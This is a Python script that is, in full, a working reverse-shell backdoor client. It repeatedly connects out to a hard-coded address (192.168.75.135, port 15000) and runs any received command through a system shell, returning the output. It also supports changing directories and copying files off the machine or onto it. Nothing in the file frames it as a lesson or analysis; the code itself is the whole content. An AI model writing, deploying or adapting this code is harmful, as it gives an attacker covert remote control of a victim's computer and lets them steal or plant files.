import socket
import time
import os
import json
import subprocess

def shell():
    while True:
        command = reliable_receive()
        if command == "quit":
            break
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
             upload_file(command[9:])
        elif command[:6] == "upload":
             download_file(command[7:])                 
        elif command == "clear":
             pass          
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result) 


def upload_file(file_name):
     f = open(file_name, "rb")
     client_socket.send(f.read())
			
def reliable_send(data):
    jsondata = json.dumps(data)
    client_socket.send(jsondata.encode())

def download_file(file_name):
    f = open(file_name, "wb")
    client_socket.settimeout(1)
    chunk = client_socket.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client_socket.recv(1024)
        except socket.timeout as e:
            break
    client_socket.settimeout(None)
    f.close()


def reliable_receive():
    data = ""
    while True:
        try:
            data = data + client_socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue            



def connection():
	while True:
		time.sleep(10)
		try:
			client_socket.connect(('192.168.75.135',15000))
			shell()
			client_socket.close()
			break
		except:
			connection()


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()